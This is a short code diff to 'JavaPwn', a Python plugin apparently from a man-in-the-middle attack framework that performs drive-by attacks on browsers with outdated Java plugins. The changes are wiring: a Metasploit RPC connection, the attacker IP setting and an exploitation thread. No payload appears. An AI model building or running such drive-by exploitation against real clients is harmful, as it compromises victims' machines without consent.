@@ -18,11 +18,13 @@ class JavaPwn(BrowserProfiler, Plugin):
     name     = "JavaPwn"
     optname  = "javapwn"
     desc     = "Performs drive-by attacks on clients with out-of-date java browser plugins"
+    depends  = ["Browserprofiler"]
     has_opts = False
 
     def initialize(self, options):
         '''Called if plugin is enabled, passed the options namespace'''
         self.options      = options
+        self.msfip        = options.ip_address
         self.sploited_ips = []  #store ip of pwned or not vulnerable clients so we don't re-exploit
 
         try:
@@ -39,13 +41,6 @@ class JavaPwn(BrowserProfiler, Plugin):
         self.rpcip   = msfcfg['rpcip']
         self.rpcpass = msfcfg['rpcpass']
 
-        try:
-            self.msfip = get_if_addr(options.interface)
-            if self.msfip == "0.0.0.0":
-                sys.exit("[-] Interface %s does not have an IP address" % options.interface)
-        except Exception, e:
-            sys.exit("[-] Error retrieving interface IP address: %s" % e)
-
         #Initialize the BrowserProfiler plugin
         BrowserProfiler.initialize(self, options)
         self.black_ips = []
@@ -58,7 +53,6 @@ class JavaPwn(BrowserProfiler, Plugin):
         except Exception:
             sys.exit("[-] Error connecting to MSF! Make sure you started Metasploit and its MSGRPC server")
 
-        print "[*] JavaPwn plugin online"
         t = threading.Thread(name='pwn', target=self.pwn, args=(msf,))
         t.setDaemon(True)
         t.start()  #start the main thread
